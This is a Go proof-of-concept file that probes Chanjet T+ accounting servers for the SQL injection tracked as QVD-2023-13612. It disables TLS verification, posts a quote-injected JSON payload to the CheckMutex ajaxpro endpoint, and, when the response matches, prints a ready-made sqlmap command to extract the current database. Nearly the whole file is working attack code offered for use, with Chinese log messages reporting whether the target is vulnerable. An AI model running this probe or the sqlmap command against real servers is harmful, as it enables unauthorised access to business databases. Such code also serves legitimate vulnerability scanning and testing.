package poc

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"log"
	"net/http"
	"regexp"
	"strings"
)

func QVD_2023_13612(target string) {
	url := strings.TrimRight(target, "/")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	pathUrl := url + "/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex"
	payload := "{\"accNum\": \"3'\", \"functionTag\": \"SYS0104\", \"url\": \"\"}"
	request, err := http.NewRequest("POST", pathUrl, bytes.NewBufferString(payload))
	if err != nil {
		log.Println("[-] Failed to create request:", err)
		return
	}

	response, err := client.Do(request)
	if err != nil {
		log.Println("[-] Request failed:", err)
		return
	}
	defer response.Body.Close()

	body, err := io.ReadAll(response.Body)
	if err != nil {
		fmt.Println(err)
		return
	}
	reg := regexp.MustCompile("value\":")
	tag := reg.MatchString(string(body))
	if response.StatusCode == http.StatusOK && tag {
		log.Println("[+] 存在畅捷通T+ SQL注入漏洞")
		log.Println("[+] 使用sqlmap执行: python sqlmap.py -u \"" + pathUrl + "\" --data \"" + `{\"accNum\": \"3'\", \"functionTag\": \"SYS0104\", \"url\": \"\"}` + "\" --random-agent --dbms mssql --hex --current-db")

	} else {
		log.Println("[-] 不存在畅捷通T+ SQL注入漏洞")
	}
}
